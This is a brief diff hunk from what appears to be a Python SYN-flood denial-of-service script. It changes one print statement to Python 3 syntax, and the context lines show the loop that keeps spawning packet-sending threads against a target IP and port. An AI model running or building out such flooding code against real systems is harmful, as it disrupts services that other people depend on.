@@ -65,7 +65,7 @@ if __name__ == "__main__":
 		threadLimit = threads
 		fragSize = size
 		total = 0
-		print "Flooding %s:%s with SYN fragmented packets" % (ip,port)
+		print ("Flooding %s:%s with SYN fragmented packets" % (ip,port))
 		while True:
 			if threading.activeCount() < threadLimit:
 				sendSYN().start()
